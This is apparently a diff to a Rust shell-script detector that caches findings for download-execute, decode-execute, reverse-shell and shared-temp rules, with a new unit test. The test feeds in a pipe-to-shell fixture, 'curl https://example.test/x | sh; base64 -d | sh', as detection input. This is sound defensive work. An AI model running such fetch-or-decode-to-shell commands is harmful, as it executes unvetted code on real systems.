@@ -4,7 +4,7 @@
 //! families — fetch-to-interpreter and decoder-to-interpreter pipelines,
 //! consumed substitution spans, reverse-shell spellings, and the shared
 //! temporary-path rules — with per-line finding deduplication.
-use super::budget::ShellBudget;
+use super::budget::{CachedFindingSummary, ShellBudget};
 use super::command::{segment_commands, skip_command_prefixes, statement_outcomes};
 use super::effects::{
     EgressEffect, StdoutEffect, body_live_fetch_stdout, command_decodes, command_fetches,
@@ -180,18 +180,11 @@ pub(in crate::detect) fn shell_consumption_findings(
                 let Some(body) = static_command_body(&command) else {
                     continue;
                 };
-                if !budget.enter() {
-                    return;
+                for finding in
+                    cached_body_consumption_findings(&body, number, download_rule, budget)
+                {
+                    push_finding(found, finding);
                 }
-                shell_consumption_findings(
-                    &tokenize(&body),
-                    None,
-                    number,
-                    download_rule,
-                    found,
-                    budget,
-                );
-                budget.leave();
             }
         }
 
@@ -335,6 +328,109 @@ fn typed_node_has_live_decoder(node: &CommandNode, budget: &mut ShellBudget) -> 
         return false;
     };
     ir_command_decodes(command) && ir_node_stdout_preserved(node, budget)
+}
+
+/// Walk a static shell body once per analysis and cache its complete finding
+/// tag set. Cached tags are re-anchored to the current line and download rule
+/// so the cache never carries source-location or caller-specific data.
+fn cached_body_consumption_findings(
+    body: &str,
+    number: u32,
+    download_rule: &'static str,
+    budget: &mut ShellBudget,
+) -> Vec<ResultParts> {
+    if budget.exhausted() {
+        return Vec::new();
+    }
+    if let Some(summary) = budget.cached_finding_summary(body) {
+        return finding_parts(summary, number, download_rule);
+    }
+    if !budget.enter() {
+        return Vec::new();
+    }
+    let mut found = Vec::new();
+    shell_consumption_findings(
+        &tokenize(body),
+        None,
+        number,
+        download_rule,
+        &mut found,
+        budget,
+    );
+    budget.leave();
+    if !budget.exhausted() {
+        budget.cache_finding_summary(body, summarize_findings(&found));
+    }
+    found
+}
+
+fn summarize_findings(found: &[ResultParts]) -> CachedFindingSummary {
+    CachedFindingSummary {
+        download_execute: found
+            .iter()
+            .any(|finding| finding.semantic_value == "download-execute"),
+        decode_execute: found
+            .iter()
+            .any(|finding| finding.semantic_value == "decode-execute"),
+        reverse_shell: found
+            .iter()
+            .any(|finding| finding.semantic_value == "reverse-shell"),
+        shared_temp_indicator: found
+            .iter()
+            .any(|finding| finding.semantic_value == "privileged-shared-temp"),
+        shared_temp_controlled: found
+            .iter()
+            .any(|finding| finding.semantic_value == "shared-temp-mode-release"),
+    }
+}
+
+fn finding_parts(
+    summary: CachedFindingSummary,
+    number: u32,
+    download_rule: &'static str,
+) -> Vec<ResultParts> {
+    let mut found = Vec::new();
+    if summary.download_execute {
+        found.push(parts(
+            download_rule,
+            number,
+            "download-execute",
+            Confidence::LexicalFallback,
+        ));
+    }
+    if summary.decode_execute {
+        found.push(parts(
+            SCRIPT_DECODE_EXECUTE_RULE,
+            number,
+            "decode-execute",
+            Confidence::LexicalFallback,
+        ));
+    }
+    if summary.reverse_shell {
+        found.push(parts(
+            SCRIPT_REVERSE_SHELL_RULE,
+            number,
+            "reverse-shell",
+            Confidence::LexicalFallback,
+        ));
+    }
+    if summary.shared_temp_indicator {
+        found.push(parts(
+            SHARED_TEMP_INDICATOR_RULE,
+            number,
+            "privileged-shared-temp",
+            Confidence::LexicalFallback,
+        ));
+    }
+    if summary.shared_temp_controlled {
+        found.push(parts(
+            SHARED_TEMP_CONTROLLED_RULE,
+            number,
+            "shared-temp-mode-release",
+            Confidence::LexicalFallback,
+        ));
+    }
+    found
 }
 
 /// Consumption families inside an arithmetic expansion: the expression's
@@ -528,6 +624,7 @@ fn span_executes_decoder(span: &str, budget: &mut ShellBudget) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::detect::SCRIPT_DOWNLOAD_EXECUTE_RULE;
     use crate::detect::shell::ir::ShellProgram;
 
     #[test]
@@ -579,5 +676,65 @@ mod tests {
             );
             assert!(!budget.exhausted(), "typed walk exhausted for {source:?}");
         }
+    }
+
+    #[test]
+    fn static_body_finding_summaries_reuse_positive_and_negative_results() {
+        let mut budget = ShellBudget::new();
+        let first = cached_body_consumption_findings(
+            "curl https://example.test/x | sh; base64 -d | sh",
+            7,
+            SCRIPT_DOWNLOAD_EXECUTE_RULE,
+            &mut budget,
+        );
+        let nodes_after_first = budget.nodes;
+        assert_eq!(first.len(), 2);
+        assert!(first.iter().any(|finding| {
+            finding.semantic_value == "download-execute" && finding.line == Some(7)
+        }));
+        assert!(
+            first
+                .iter()
+                .any(|finding| finding.semantic_value == "decode-execute")
+        );
+
+        let second = cached_body_consumption_findings(
+            "curl https://example.test/x | sh; base64 -d | sh",
+            99,
+            SCRIPT_DOWNLOAD_EXECUTE_RULE,
+            &mut budget,
+        );
+        assert_eq!(budget.nodes, nodes_after_first);
+        assert_eq!(second.len(), first.len());
+        assert!(second.iter().all(|finding| finding.line == Some(99)));
+
+        let safe_first = cached_body_consumption_findings(
+            "echo safe",
+            1,
+            SCRIPT_DOWNLOAD_EXECUTE_RULE,
+            &mut budget,
+        );
+        let nodes_after_safe = budget.nodes;
+        let safe_second = cached_body_consumption_findings(
+            "echo safe",
+            2,
+            SCRIPT_DOWNLOAD_EXECUTE_RULE,
+            &mut budget,
+        );
+        assert!(safe_first.is_empty());
+        assert!(safe_second.is_empty());
+        assert_eq!(budget.nodes, nodes_after_safe);
+        assert!(!budget.exhausted());
+
+        assert!(!budget.spend(usize::MAX));
+        assert!(
+            cached_body_consumption_findings(
+                "curl https://example.test/x | sh; base64 -d | sh",
+                3,
+                SCRIPT_DOWNLOAD_EXECUTE_RULE,
+                &mut budget,
+            )
+            .is_empty()
+        );
     }
 }
